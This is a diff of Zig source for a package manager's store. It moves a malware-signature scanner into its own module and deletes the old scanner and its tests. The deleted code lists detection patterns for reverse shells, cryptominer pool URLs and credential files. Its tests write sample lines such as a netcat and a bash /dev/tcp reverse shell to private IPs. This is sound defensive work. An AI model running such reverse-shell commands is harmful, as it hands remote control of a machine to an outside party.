@@ -18,6 +18,7 @@ const ghverify = @import("ghverify.zig");
 const bindetect = @import("bindetect.zig");
 const shim = @import("shim.zig");
 const cas = @import("cas.zig");
+const scan = @import("scan.zig");
 
 pub const Package = registry.Package;
 
@@ -1747,202 +1748,30 @@ pub const Store = struct {
         return healed;
     }
 
-    // -----------------------------------------------------------------------
-    // Malware heuristics
-    // -----------------------------------------------------------------------
-
-    pub const Threat = struct {
-        score: u32 = 0,
-        reasons: std.ArrayList([]const u8),
-
-        pub fn deinit(self: *Threat) void {
-            self.reasons.deinit();
-        }
-    };
-
-    /// Strong signatures are specific to malicious payloads and block an
-    /// install. Weak ones also turn up in ordinary tools (a cloud CLI names
-    /// AWS_SECRET_ACCESS_KEY, an SSH helper reads ~/.ssh/id_rsa) and are only
-    /// reported by `abv0 detect`. Patterns are whole commands, not fragments:
-    /// "nc -e" alone matched "-sync -enable" in clangd, and "nicehash" matched
-    /// the public-suffix list that many Go programs embed.
-    const signatures = [_]struct { pattern: []const u8, weight: u32, reason: []const u8, strong: bool }{
-        .{ .pattern = "bash -i >& /dev/tcp/", .weight = 60, .reason = "bash reverse shell over /dev/tcp", .strong = true },
-        .{ .pattern = "/sh -i >& /dev/tcp/", .weight = 60, .reason = "shell reverse shell over /dev/tcp", .strong = true },
-        .{ .pattern = "0>&1 | nc ", .weight = 60, .reason = "shell piped to netcat (reverse shell)", .strong = true },
-        .{ .pattern = "nc -e /bin/sh", .weight = 60, .reason = "netcat running a shell (reverse shell)", .strong = true },
-        .{ .pattern = "nc -e /bin/bash", .weight = 60, .reason = "netcat running a shell (reverse shell)", .strong = true },
-        .{ .pattern = "ncat -e /bin/", .weight = 60, .reason = "ncat running a shell (reverse shell)", .strong = true },
-        .{ .pattern = "|/bin/sh -i 2>&1|nc ", .weight = 60, .reason = "fifo reverse shell through netcat", .strong = true },
-        .{ .pattern = "stratum+tcp://", .weight = 60, .reason = "mining pool address (cryptominer)", .strong = true },
-        .{ .pattern = "stratum+ssl://", .weight = 60, .reason = "mining pool address (cryptominer)", .strong = true },
-        .{ .pattern = "/etc/shadow", .weight = 20, .reason = "mentions the shadow password file", .strong = false },
-        .{ .pattern = "/.ssh/id_rsa", .weight = 20, .reason = "mentions an SSH private key path", .strong = false },
-        .{ .pattern = "curl | sh", .weight = 15, .reason = "pipe-to-shell command", .strong = false },
-        .{ .pattern = "wget -O- | sh", .weight = 15, .reason = "pipe-to-shell command", .strong = false },
-        .{ .pattern = "AWS_SECRET_ACCESS_KEY", .weight = 10, .reason = "mentions cloud credentials", .strong = false },
-    };
-
-    /// Bit i of a `SignatureMask` stands for `signatures[i]`.
-    const SignatureMask = std.meta.Int(.unsigned, signatures.len);
-
-    /// Bit i is set when `signatures[i]` begins with that byte, so a scan
-    /// needs one table lookup per byte rather than one search per signature.
-    const first_byte_table = blk: {
-        var table = [_]SignatureMask{0} ** 256;
-        for (signatures, 0..) |sig, i| {
-            table[sig.pattern[0]] |= @as(SignatureMask, 1) << @intCast(i);
-        }
-        break :blk table;
-    };
-
-    /// Longest signature, in bytes. A match of this length can straddle a read
-    /// boundary, so each read keeps this many bytes minus one from the last.
-    const longest_signature = blk: {
-        var longest: usize = 0;
-        for (signatures) |sig| longest = @max(longest, sig.pattern.len);
-        break :blk longest;
-    };
-
-    const scan_chunk = 256 * 1024;
-    const scan_overlap = longest_signature - 1;
-
-    /// Streaming scan with an overlap window.
-    ///
-    /// The original read the entire executable into memory with a 50 MB cap and
-    /// then made a separate full pass per signature. This makes one pass with a
-    /// bounded buffer, so a large binary no longer costs 50 MB of RSS, and it
-    /// no longer misses a pattern that straddles a read boundary.
-    pub fn scanFile(a: std.mem.Allocator, path: []const u8) !Threat {
-        var threat = Threat{ .reasons = std.ArrayList([]const u8).init(a) };
-        errdefer threat.deinit();
-
-        const file = try std.fs.cwd().openFile(path, .{});
-        defer file.close();
-
-        const buf = try a.alloc(u8, scan_chunk + scan_overlap);
-        defer a.free(buf);
-
-        const hits = try scanMask(file, buf);
-        // Report in signature order, as the per-signature passes did.
-        for (signatures, 0..) |sig, i| {
-            if ((hits >> @intCast(i)) & 1 == 0) continue;
-            threat.score += sig.weight;
-            try threat.reasons.append(sig.reason);
-        }
-        if (threat.score > 100) threat.score = 100;
-        return threat;
-    }
-
-    /// Which signatures occur in `file`, as a mask. `buf` must hold
-    /// `scan_chunk + scan_overlap` bytes.
-    fn scanMask(file: std.fs.File, buf: []u8) !SignatureMask {
-        const all: SignatureMask = std.math.maxInt(SignatureMask);
-        var seen: SignatureMask = 0;
-        var carry: usize = 0;
-        while (seen != all) {
-            const n = try file.read(buf[carry..]);
-            if (n == 0) break;
-            const filled = carry + n;
-
-            // Every start position is tried, so a pattern beginning in the
-            // carried overlap is found here.
-            for (buf[0..filled], 0..) |byte, pos| {
-                var candidates = first_byte_table[byte] & ~seen;
-                while (candidates != 0) {
-                    const i: usize = @ctz(candidates);
-                    candidates &= candidates - 1;
-                    if (std.mem.startsWith(u8, buf[pos..filled], signatures[i].pattern)) {
-                        seen |= @as(SignatureMask, 1) << @intCast(i);
-                    }
-                }
-            }
-
-            carry = @min(scan_overlap, filled);
-            std.mem.copyForwards(u8, buf[0..carry], buf[filled - carry ..][0..carry]);
-        }
-        return seen;
-    }
-
-    /// The install-time scan: every file of a freshly unpacked package, before
-    /// anything is linked. A strong signature removes the package and fails
-    /// the install unless `allow_suspicious`; weak ones stay quiet here (they
-    /// are common in ordinary tools) and are listed by `abv0 detect`.
-    /// `ABV0_NO_SCAN=1` turns the scan off.
+    /// The install-time scan (see scan.zig): every file of a freshly unpacked
+    /// package, before anything is linked. A strong finding removes the
+    /// package and fails the install unless `allow_suspicious`; weak ones stay
+    /// quiet here and are listed by `abv0 detect`. `ABV0_NO_SCAN=1` turns the
+    /// scan off.
     fn scanOrReject(a: std.mem.Allocator, name: []const u8, pkg_dir: []const u8, opts: InstallOptions) !void {
         if (cas.envFlag("ABV0_NO_SCAN")) return;
         var arena = std.heap.ArenaAllocator.init(a);
         defer arena.deinit();
-        const scan = scanTree(arena.allocator(), pkg_dir) catch return;
-        if (!scan.blocked) return;
+        const result = scan.scanTree(arena.allocator(), pkg_dir) catch return;
+        if (!result.blocked) return;
         if (opts.allow_suspicious) {
             term.err("{s}warning{s}: {s} looks malicious; installing anyway (--allow-suspicious):\n", .{ term.yellow, term.reset, name });
-            for (scan.findings) |f| if (f.strong) term.err("  - {s} ({s})\n", .{ f.reason, f.file });
-            return;
+        } else {
+            term.err("{s}error{s}: {s} looks malicious, so it was removed and nothing was linked:\n", .{ term.red, term.reset, name });
         }
-        term.err("{s}error{s}: {s} looks malicious, so it was removed and nothing was linked:\n", .{ term.red, term.reset, name });
-        for (scan.findings) |f| if (f.strong) term.err("  - {s} ({s})\n", .{ f.reason, f.file });
+        for (result.findings) |f| {
+            if (!f.strong) continue;
+            term.err("  - {s} ({s}{s})\n", .{ f.reason, f.file, if (f.hidden) ", hidden in base64" else "" });
+        }
+        if (opts.allow_suspicious) return;
         term.err("  If you trust it, re-run with --allow-suspicious.\n", .{});
         std.fs.cwd().deleteTree(pkg_dir) catch {};
         return StoreError.SuspiciousPackage;
-    }
-
-    /// One signature found while scanning a package, and the first file
-    /// (relative to the package root) it was found in.
-    pub const Finding = struct {
-        reason: []const u8,
-        strong: bool,
-        weight: u32,
-        file: []const u8,
-    };
-
-    pub const TreeScan = struct {
-        score: u32 = 0,
-        /// True when a strong signature matched: see `signatures`.
-        blocked: bool = false,
-        findings: []Finding = &.{},
-        files: usize = 0,
-        bytes: u64 = 0,
-    };
-
-    /// Scan every regular file under `dir` (symlinks are not followed).
-    /// Allocations come from `a`, which should be an arena.
-    pub fn scanTree(a: std.mem.Allocator, dir_path: []const u8) !TreeScan {
-        var dir = try std.fs.cwd().openDir(dir_path, .{ .iterate = true, .no_follow = true });
-        defer dir.close();
-        var walker = try dir.walk(a);
-        defer walker.deinit();
-
-        const buf = try a.alloc(u8, scan_chunk + scan_overlap);
-        var found: SignatureMask = 0;
-        var first_file: [signatures.len][]const u8 = undefined;
-        var out = TreeScan{};
-
-        while (try walker.next()) |entry| {
-            if (entry.kind != .file) continue;
-            const file = entry.dir.openFile(entry.basename, .{}) catch continue;
-            defer file.close();
-            out.files += 1;
-            out.bytes += (file.stat() catch continue).size;
-            const hits = scanMask(file, buf) catch continue;
-            const new = hits & ~found;
-            if (new == 0) continue;
-            for (0..signatures.len) |i| {
-                if ((new >> @intCast(i)) & 1 == 1) first_file[i] = try a.dupe(u8, entry.path);
-            }
-            found |= new;
-        }
-
-        var list = std.ArrayList(Finding).init(a);
-        for (signatures, 0..) |sig, i| {
-            if ((found >> @intCast(i)) & 1 == 0) continue;
-            out.score += sig.weight;
-            if (sig.strong) out.blocked = true;
-            try list.append(.{ .reason = sig.reason, .strong = sig.strong, .weight = sig.weight, .file = first_file[i] });
-        }
-        if (out.score > 100) out.score = 100;
-        out.findings = try list.toOwnedSlice();
-        return out;
     }
 
     /// Resolve the on-disk executable for a package, honouring bin_path
@@ -2938,61 +2767,6 @@ test "storeDirName rejects hostile identifiers" {
     );
 }
 
-test "scanFile scores known malware patterns and stays clean otherwise" {
-    var tmp = testing.tmpDir(.{});
-    defer tmp.cleanup();
-    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
-    defer testing.allocator.free(root);
-
-    const bad = try std.fs.path.join(testing.allocator, &.{ root, "bad.sh" });
-    defer testing.allocator.free(bad);
-    {
-        const f = try std.fs.cwd().createFile(bad, .{});
-        defer f.close();
-        try f.writeAll("#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\nstratum+tcp://pool.example:3333\n");
-    }
-    var t1 = try Store.scanFile(testing.allocator, bad);
-    defer t1.deinit();
-    try testing.expect(t1.score >= 90);
-    try testing.expect(t1.reasons.items.len >= 2);
-
-    const good = try std.fs.path.join(testing.allocator, &.{ root, "good.sh" });
-    defer testing.allocator.free(good);
-    {
-        const f = try std.fs.cwd().createFile(good, .{});
-        defer f.close();
-        try f.writeAll("#!/bin/sh\necho hello world\n");
-    }
-    var t2 = try Store.scanFile(testing.allocator, good);
-    defer t2.deinit();
-    try testing.expectEqual(@as(u32, 0), t2.score);
-}
-
-test "scanFile catches a signature straddling a read boundary" {
-    var tmp = testing.tmpDir(.{});
-    defer tmp.cleanup();
-    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
-    defer testing.allocator.free(root);
-    const p = try std.fs.path.join(testing.allocator, &.{ root, "split.bin" });
-    defer testing.allocator.free(p);
-
-    {
-        const f = try std.fs.cwd().createFile(p, .{});
-        defer f.close();
-        // Land "stratum+tcp://" exactly across the 256 KiB chunk boundary.
-        const pad = 256 * 1024 - 7;
-        const filler = try testing.allocator.alloc(u8, pad);
-        defer testing.allocator.free(filler);
-        @memset(filler, 'A');
-        try f.writeAll(filler);
-        try f.writeAll("stratum+tcp://pool");
-    }
-
-    var t = try Store.scanFile(testing.allocator, p);
-    defer t.deinit();
-    try testing.expect(t.score > 0);
-}
-
 test "digestFile hashes in one pass and keeps the leading bytes" {
     var tmp = testing.tmpDir(.{});
     defer tmp.cleanup();
@@ -3045,34 +2819,6 @@ test "micro-split reassembly hashes exactly the bytes it writes" {
     h.final(&want);
     const got = d.final();
     try testing.expectEqualSlices(u8, &want, &got);
-}
-
-test "scanFile finds a signature straddling the first read boundary" {
-    var tmp = testing.tmpDir(.{});
-    defer tmp.cleanup();
-    const root = try tmp.dir.realpathAlloc(testing.allocator, ".");
-    defer testing.allocator.free(root);
-    const p = try std.fs.path.join(testing.allocator, &.{ root, "boundary.bin" });
-    defer testing.allocator.free(p);
-
-    // The first read fills the whole buffer, so its end is the first boundary.
-    // Every start that makes the longest signature cross it must be caught.
-    const pattern = "AWS_SECRET_ACCESS_KEY";
-    const boundary = Store.scan_chunk + Store.scan_overlap;
-    const data = try testing.allocator.alloc(u8, boundary + 4096);
-    defer testing.allocator.free(data);
-
-    var offset: usize = boundary - pattern.len + 1;
-    while (offset < boundary) : (offset += 1) {
-        @memset(data, 'A');
-        @memcpy(data[offset..][0..pattern.len], pattern);
-        try tmp.dir.writeFile(.{ .sub_path = "boundary.bin", .data = data });
-
-        var t = try Store.scanFile(testing.allocator, p);
-        defer t.deinit();
-        try testing.expectEqual(@as(u32, 10), t.score);
-        try testing.expectEqual(@as(usize, 1), t.reasons.items.len);
-    }
 }
 
 test "scanStore groups every store directory by package name in one pass" {
@@ -3845,35 +3591,6 @@ test "binMatchRank prefers the main program's directory, then bin/" {
     try testing.expect(beside < completion);
     try testing.expect(r("x" ++ sep ++ "bin" ++ sep ++ "tool", "") < r("tool-data" ++ sep ++ "tool", ""));
     try testing.expect(r("tool", "") < r("a" ++ sep ++ "b" ++ sep ++ "tool", ""));
-}
-
-test "scanTree blocks strong signatures and only reports weak ones" {
-    var tmp = testing.tmpDir(.{ .iterate = true });
-    defer tmp.cleanup();
-    var arena = std.heap.ArenaAllocator.init(testing.allocator);
-    defer arena.deinit();
-    const a = arena.allocator();
-
-    try tmp.dir.makePath("clean/bin");
-    try tmp.dir.writeFile(.{ .sub_path = "clean/bin/tool", .data = "#!/bin/sh\necho hi\n" });
-    // Ordinary tools mention credentials; that alone never blocks.
-    try tmp.dir.writeFile(.{ .sub_path = "clean/README", .data = "export AWS_SECRET_ACCESS_KEY=... and ~/.ssh/id_rsa" });
-    // Fragments that matched legitimate binaries before.
-    try tmp.dir.writeFile(.{ .sub_path = "clean/bin/other", .data = "-sync -enable-test leuvenicehashbang" });
-    const clean = try tmp.dir.realpathAlloc(a, "clean");
-    const c = try Store.scanTree(a, clean);
-    try testing.expect(!c.blocked);
-    try testing.expectEqual(@as(usize, 2), c.findings.len);
-    try testing.expectEqual(@as(usize, 3), c.files);
-
-    try tmp.dir.makePath("bad/lib");
-    try tmp.dir.writeFile(.{ .sub_path = "bad/bin", .data = "ok" });
-    try tmp.dir.writeFile(.{ .sub_path = "bad/lib/payload", .data = "x\x00bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\x00y" });
-    const bad = try tmp.dir.realpathAlloc(a, "bad");
-    const b = try Store.scanTree(a, bad);
-    try testing.expect(b.blocked);
-    try testing.expectEqual(@as(usize, 1), b.findings.len);
-    try testing.expectEqualStrings("lib/payload", b.findings[0].file);
 }
 
 test "install refuses a package the scan blocks and links nothing" {
